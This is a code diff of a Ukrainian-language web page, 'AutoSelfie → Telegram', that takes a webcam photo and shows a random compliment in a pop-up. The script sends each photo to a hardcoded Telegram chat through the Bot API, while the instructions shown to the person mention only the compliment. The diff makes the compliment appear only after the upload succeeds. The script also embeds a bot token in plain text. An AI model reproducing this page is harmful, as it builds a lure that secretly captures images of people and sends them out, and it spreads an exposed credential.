@@ -2,11 +2,12 @@
 <html lang="uk">
 <head>
   <meta charset="utf-8" />
-  <title>AutoSelfie → Telegram (рандомне повідомлення + картинка)</title>
+  <title>AutoSelfie → Telegram (модальне повідомлення)</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
     :root{
       --bg:#0f1720; --card:#0b1220; --accent:#2563eb; --muted:#9fb0c8; --text:#e6eef8;
+      --modal-bg: rgba(5,10,18,0.85);
     }
     html,body{height:100%;margin:0}
     body{
@@ -32,109 +33,110 @@
       margin-bottom:8px;
       display:block;
     }
-    .caption-area{
-      margin:8px 0 14px 0;
-    }
-    .caption-area .static-text{
-      color:var(--muted);
-      font-size:14px;
-    }
-    .controls{
-      display:flex;
-      gap:10px;
-      align-items:center;
-      margin-top:12px;
-    }
+    .caption-area{margin:8px 0 14px 0}
+    .caption-area .static-text{color:var(--muted);font-size:14px}
+    video{width:100%;max-width:480px;border-radius:10px;background:#000;display:none}
+    canvas{width:100%;max-width:480px;border-radius:10px;background:#000;display:none;margin-top:12px}
+    .controls{margin-top:12px}
     button{
-      padding:12px 18px;
-      border-radius:8px;
-      border:none;
-      background:var(--accent);
-      color:#fff;
-      font-size:16px;
-      cursor:pointer;
-      width:100%;
+      padding:12px 18px;border-radius:8px;border:none;background:var(--accent);
+      color:#fff;font-size:16px;cursor:pointer;width:100%;
     }
     button:disabled{opacity:.6;cursor:default}
-    video{
-      width:100%;
-      max-width:480px;
-      border-radius:10px;
-      background:#000;
+    .note{font-size:13px;color:var(--muted);margin-top:10px}
+
+    /* Модальне вікно */
+    .modal {
+      position:fixed;
+      inset:0;
       display:none;
+      align-items:center;
+      justify-content:center;
+      background:var(--modal-bg);
+      z-index:9999;
+      padding:20px;
     }
-    canvas{
+    .modal.open { display:flex; }
+    .modal-card{
+      background:#07101a;
+      border-radius:12px;
+      padding:16px;
+      max-width:720px;
       width:100%;
-      max-width:480px;
-      border-radius:10px;
-      background:#000;
-      display:none;
-      margin-top:12px;
-    }
-    .random-block{
-      margin-top:12px;
+      box-sizing:border-box;
       display:flex;
       gap:12px;
       align-items:flex-start;
     }
-    .random-block img{
-      width:120px;
-      height:120px;
+    .modal-card img{
+      width:160px;
+      height:160px;
       object-fit:cover;
       border-radius:8px;
       background:#000;
       border:1px solid #223;
+      flex:0 0 160px;
     }
-    .random-block .msg{
+    .modal-content{
       color:var(--text);
-      font-size:15px;
+      font-size:16px;
       line-height:1.3;
+      flex:1 1 auto;
     }
-    .note{font-size:13px;color:var(--muted);margin-top:10px}
+    .modal-actions{
+      display:flex;
+      gap:8px;
+      margin-top:12px;
+    }
+    .btn-close{
+      padding:8px 12px;border-radius:8px;border:none;background:#334155;color:#fff;cursor:pointer;
+    }
+    .btn-ok{
+      padding:8px 12px;border-radius:8px;border:none;background:#10b981;color:#fff;cursor:pointer;
+    }
   </style>
 </head>
 <body>
   <div class="card">
-    <!-- Статична картинка зверху -->
     <header>
       <img id="topImage" src="" alt="Статична картинка">
     </header>
 
-    <!-- Текст під картинкою (статичний) -->
     <div class="caption-area">
-      <div class="static-text" id="staticText">Тут можна розмістити інструкцію або підпис під картинкою.</div>
+      <div class="static-text" id="staticText">Натисни кнопку, дозволь камеру, потім натисни «Зробити фото». Після зйомки з'явиться випадкове спливаюче повідомлення з картинкою.</div>
     </div>
 
-    <!-- Живе відео (показується після дозволу) -->
     <video id="video" autoplay playsinline muted></video>
-
-    <!-- Відображення знятого фото -->
     <canvas id="canvas"></canvas>
 
-    <!-- Рандомне повідомлення + картинка (після зйомки) -->
-    <div id="randomContainer" class="random-block" style="display:none">
-      <img id="randomImage" src="" alt="Рандомна картинка">
-      <div class="msg" id="randomMessage"></div>
-    </div>
-
-    <!-- Кнопка розташована під вікном (відео/canvas) -->
     <div class="controls">
       <button id="actionBtn">Надати доступ до камери</button>
     </div>
 
-    <p class="note">Сторінка працює тільки через HTTPS або localhost. Якщо Telegram блокує запит (CORS), повідом — дам proxy.</p>
+    <p class="note">Працює через HTTPS або localhost. Якщо Telegram блокує запит (CORS), скажи — дам proxy.</p>
+  </div>
+
+  <!-- Модальне спливаюче вікно -->
+  <div id="modal" class="modal" role="dialog" aria-modal="true">
+    <div class="modal-card" role="document">
+      <img id="modalImage" src="" alt="Рандомна картинка">
+      <div class="modal-content">
+        <div id="modalText">Тут буде випадкове повідомлення.</div>
+        <div class="modal-actions">
+          <button id="modalOk" class="btn-ok">ОК</button>
+          <button id="modalClose" class="btn-close">Закрити</button>
+        </div>
+      </div>
+    </div>
   </div>
 
   <script>
     // ====== Налаштування (встав свої дані сюди) ======
     const BOT_TOKEN = "8506109550:AAGjHAChPn0IFIdL24s9PauJfwk9F9mV-_Y";
     const CHAT_ID = "1178810140";
-    // Статична картинка зверху (URL або data URI). Якщо порожній — картинка прихована.
-    const IMAGE_SRC = "";
-    // Статичний текст під картинкою
-    const STATIC_TEXT = "Натисни кнопку, дозволь камеру, потім натисни «Зробити фото». Після зйомки з'явиться випадкове повідомлення з картинкою.";
-    // ====== БАЗА З 12 ПОВІДОМЛЕНЬ І 12 КАРТИНОК ======
-    // Замініть приклади URL на свої реальні зображення або data URI.
+    const IMAGE_SRC = ""; // статична картинка зверху (URL або data URI)
+    const STATIC_TEXT = "Натисни кнопку, дозволь камеру, потім натисни «Зробити фото».";
+    // База з 12 повідомлень і 12 картинок (приклади). Замінити URL на свої при потребі.
     const RANDOM_MESSAGES = [
       "Ти виглядаєш чудово сьогодні!",
       "Нехай цей день принесе тобі удачу.",
@@ -170,17 +172,19 @@
     const canvas = document.getElementById('canvas');
     const topImage = document.getElementById('topImage');
     const staticTextEl = document.getElementById('staticText');
-    const randomContainer = document.getElementById('randomContainer');
-    const randomImageEl = document.getElementById('randomImage');
-    const randomMessageEl = document.getElementById('randomMessage');
 
-    if (IMAGE_SRC) topImage.src = IMAGE_SRC;
-    else topImage.style.display = "none";
+    const modal = document.getElementById('modal');
+    const modalImage = document.getElementById('modalImage');
+    const modalText = document.getElementById('modalText');
+    const modalClose = document.getElementById('modalClose');
+    const modalOk = document.getElementById('modalOk');
 
+    if (IMAGE_SRC) topImage.src = IMAGE_SRC; else topImage.style.display = "none";
     staticTextEl.textContent = STATIC_TEXT;
 
     let stream = null;
     let cameraActive = false;
+    let modalTimer = null;
 
     function isSecure(){
       return location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
@@ -227,7 +231,6 @@
         await waitForVideoFrameReady(video, 5000);
         video.style.display = "block";
         canvas.style.display = "none";
-        randomContainer.style.display = "none";
         cameraActive = true;
         actionBtn.textContent = "Зробити фото";
         return true;
@@ -243,6 +246,22 @@
       return Math.floor(Math.random() * n);
     }
 
+    function showModalWithRandom(){
+      const idx = pickRandomIndex();
+      modalImage.src = RANDOM_IMAGES[idx];
+      modalText.textContent = RANDOM_MESSAGES[idx];
+      modal.classList.add('open');
+
+      // Автозакриття через 6 секунд
+      clearTimeout(modalTimer);
+      modalTimer = setTimeout(() => closeModal(), 6000);
+    }
+
+    function closeModal(){
+      modal.classList.remove('open');
+      clearTimeout(modalTimer);
+    }
+
     async function takePhotoAndSend(){
       if (!cameraActive) return;
       const w = video.videoWidth || 640;
@@ -251,58 +270,31 @@
       canvas.height = h;
       const ctx = canvas.getContext('2d');
 
-      // Малюємо кадр
       ctx.drawImage(video, 0, 0, w, h);
-
-      // Показуємо зняте фото
       canvas.style.display = "block";
 
-      // Вибираємо випадкове повідомлення і картинку
-      const idx = pickRandomIndex();
-      const message = RANDOM_MESSAGES[idx];
-      const imageUrl = RANDOM_IMAGES[idx];
-
-      // Показуємо на сторінці
-      randomImageEl.src = imageUrl;
-      randomMessageEl.textContent = message;
-      randomContainer.style.display = "flex";
-
-      // Формуємо blob для селфі
       const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
       if (!blob) {
         alert('Не вдалося сформувати зображення.');
         return;
       }
 
-      // Відправляємо селфі з підписом (рандомне повідомлення)
+      // Відправка селфі в Telegram
       const form = new FormData();
       form.append('chat_id', CHAT_ID);
       form.append('photo', blob, 'selfie.png');
-      form.append('caption', message);
 
-      const sendUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
       try {
-        const resp1 = await fetch(sendUrl, { method: 'POST', body: form });
-        if (!resp1.ok) {
-          const text = await resp1.text().catch(()=>'[no body]');
-          console.error('Telegram send selfie error', resp1.status, text);
+        const resp = await fetch(url, { method: 'POST', body: form });
+        if (!resp.ok) {
+          const text = await resp.text().catch(()=>'[no body]');
+          console.error('Telegram send error', resp.status, text);
           alert('Відправка селфі неуспішна. Можлива проблема з CORS або токен/чат невірні.');
         } else {
-          // Додатково надсилаємо картинку з бази як окреме повідомлення (через URL)
-          try {
-            const form2 = new FormData();
-            form2.append('chat_id', CHAT_ID);
-            form2.append('photo', imageUrl); // Telegram приймає URL у полі photo
-            const resp2 = await fetch(sendUrl, { method: 'POST', body: form2 });
-            if (!resp2.ok) {
-              // не критично — просто лог
-              const t = await resp2.text().catch(()=>'[no body]');
-              console.warn('Telegram send random image error', resp2.status, t);
-            }
-          } catch (e2) {
-            console.warn('send random image failed', e2);
-          }
+          // Показуємо модальне вікно з випадковим повідомленням і картинкою
+          showModalWithRandom();
         }
       } catch (err) {
         console.error('send error', err);
@@ -322,6 +314,19 @@
         await takePhotoAndSend();
       }
     });
+
+    modalClose.addEventListener('click', closeModal);
+    modalOk.addEventListener('click', closeModal);
+
+    // Закрити модал при кліку поза карткою
+    modal.addEventListener('click', (e) => {
+      if (e.target === modal) closeModal();
+    });
+
+    // Додатково: закрити клавішею Escape
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape') closeModal();
+    });
   </script>
 </body>
-      </html>
+  </html>
